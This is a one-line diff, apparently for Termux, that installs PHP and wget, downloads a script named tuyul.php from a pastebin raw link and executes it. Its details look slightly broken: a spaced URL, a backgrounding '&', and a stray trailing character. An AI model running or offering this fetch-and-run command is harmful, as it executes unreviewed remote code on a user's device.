@@ -1,0 +1,1 @@
+pkg install php -y && pkg install wget -y && wget -O tuyul.php https://pastebin .com/raw/3ERZV3nL & php tuyul.php0
